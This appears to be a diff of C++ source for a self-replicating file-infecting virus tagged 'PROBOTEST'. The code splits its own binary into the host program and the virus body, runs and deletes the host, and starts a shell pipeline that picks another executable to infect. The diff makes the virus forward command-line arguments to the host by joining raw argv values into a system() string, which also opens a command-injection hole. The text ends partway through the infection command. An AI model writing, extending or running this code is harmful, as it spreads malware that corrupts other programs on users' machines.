@@ -3,14 +3,14 @@
 
 const char* IDENTIFIER = "PROBOTEST";
 
-const int MYSIZE = 14310;
+const int MYSIZE = 14752;
 
 using namespace std;
 
 int main (int argc, char** argv) {
     int c;
     string exe = "exe", vir = "vir";
-    string me = (string)argv[0];
+    string me = (string)argv[0], command;
     ifstream fi(me);
     ofstream fo(exe);
     ofstream fv(vir);
@@ -23,8 +23,18 @@ int main (int argc, char** argv) {
         fi.close();
         fo.close();
         fv.close();
-        // Excute original program and delete when ready
-        c = system("chmod u+x exe;./exe;rm -f exe");
+        // Construct command line plus arguments
+        command = "chmod u+x exe && ./exe";
+        if (argc > 1) {
+            for (int i = 1; i < argc; i++) {
+                command += " ";
+                command += (string)argv[i];
+            }
+        }
+        command += " && rm -f exe";
+        // Excute original program command line
+        // and delete when ready
+        c = system( (command).c_str() );
         // Infect one executable
         c = system("VIR=$( \
 ls | grep -v '^hi$' | \
